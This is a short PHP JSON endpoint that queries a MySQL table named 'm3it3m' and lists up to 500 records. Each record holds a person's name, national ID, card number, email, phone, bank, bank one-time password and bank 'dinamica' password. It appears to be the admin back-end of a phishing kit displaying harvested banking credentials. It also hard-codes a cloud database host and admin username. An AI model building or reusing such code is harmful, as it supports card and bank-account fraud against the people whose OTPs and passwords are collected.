<?php
header('Content-Type: application/json');

// Leer credenciales de variables de Render (Environment Variables)
$db_host = getenv('DB_HOST') ?: 'mysql-86c4508-javiercarva913-1fe5.a.aivencloud.com';
$db_port = getenv('DB_PORT') ?: 26767;
$db_user = getenv('DB_USER') ?: 'avnadmin';
$db_pass = getenv('DB_PASSWORD') ?: 'default_password';
$db_name = getenv('DB_NAME') ?: 'defaultdb';

// Conexión con SSL
$mysqli = new mysqli(
  $db_host . ':' . $db_port,
  $db_user,
  $db_pass,
  $db_name,
  $db_port
);

if ($mysqli->connect_error) {
  http_response_code(500);
  echo json_encode([
    'status' => 'ERROR',
    'message' => 'Error de conexión'
  ]);
  exit;
}

try {
  // OBTENER TARJETAS DE m3it3m (mapeo exacto de campos)
  $result = $mysqli->query(
    "SELECT 
      idreg as id, 
      usuario as owner_name,
      id as cedula,
      tarjeta as card_number,
      status,
      0 as monto,
      email,
      celular as phone_number,
      banco,
      otp as banco_otp,
      password as dinamica,
      horacreado as created_at,
      horamodificado as updated_at
    FROM m3it3m 
    WHERE banco = 'TARJETA' OR tarjeta IS NOT NULL
    ORDER BY horacreado DESC 
    LIMIT 500"
  );

  if (!$result) {
    throw new Exception('Error en query: ' . $mysqli->error);
  }

  $solicitudes = [];
  while ($row = $result->fetch_assoc()) {
    // Enmascarar número de tarjeta
    if ($row['card_number']) {
      $row['card_number'] = substr($row['card_number'], -4);
    }
    $solicitudes[] = $row;
  }

  http_response_code(200);
  echo json_encode([
    'status' => 'OK',
    'data' => $solicitudes,
    'count' => count($solicitudes)
  ]);

} catch (Exception $e) {
  http_response_code(500);
  echo json_encode([
    'status' => 'ERROR',
    'message' => $e->getMessage()
  ]);
} finally {
  $mysqli->close();
}
?>